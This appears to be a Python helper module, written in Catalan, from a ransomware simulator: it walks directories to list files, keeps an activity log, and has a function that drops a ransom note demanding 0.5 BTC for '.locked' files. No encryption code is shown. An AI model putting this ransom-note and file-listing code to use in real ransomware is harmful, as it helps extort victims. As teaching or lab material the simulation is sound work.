import os
from datetime import datetime

# Configurem la ruta del log
RUTA_LOGS = os.path.join("logs", "activity.log")

def llistar_fitxers(ruta):
    llista_final = []
    if os.path.exists(ruta):
        for arrel, directoris, fitxers in os.walk(ruta):
            for nom in fitxers:
                # Ajuntem la ruta per a subcarpetes
                llista_final.append(os.path.join(arrel, nom))
        return llista_final
    return []

def registrar_log(missatge, nivell):
    carpeta_logs = os.path.dirname(RUTA_LOGS)
    if not os.path.exists(carpeta_logs):
        os.makedirs(carpeta_logs)
    data = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    # Missatge sense accents ni caracters especials
    linia = f"[{data}] [{nivell}] {missatge}\n"
    with open(RUTA_LOGS, "a", encoding="utf-8") as f:
        f.write(linia)

def llegir_logs():
    print("\n--- HISTORIAL D ACTIVITAT (LOGS) ---")
    if os.path.exists(RUTA_LOGS):
        try:
            with open(RUTA_LOGS, "r", encoding="utf-8") as f:
                contingut = f.read()
                if contingut:
                    print(contingut)
                else:
                    print("[!] El fitxer de logs esta buit.")
        except Exception as e:
            print(f"[X] Error llegint els logs: {e}")
    else:
        print("[!] No hi ha logs disponibles.")
    print("------------------------------------\n")

def generar_nota_rescat(directori):
    contingut = (
        "HEM XIFRAT ELS TEUS FITXERS!\n\n"
        "Per recuperar les dades, necessites la clau de desxifratge.\n"
        "1. No intentis modificar els fitxers .locked.\n"
        "2. Envia 0.5 BTC a l adreca: bc1qxy2kgdy6jrsqx7644vvv\n"
        "3. Un cop pagat, envia un correu a: support@simulador.com\n"
    )

    ruta_nota = os.path.join(directori, "INSTRUCCIONS_RECUPERACIO.txt")
    
    try:
        with open(ruta_nota, "w", encoding="utf-8") as f:
            f.write(contingut)
        print(f"[+] Nota de rescat creada a: {ruta_nota}")
    except Exception as e:
        print(f"[X] ERROR CREANT LA NOTA: {e}")
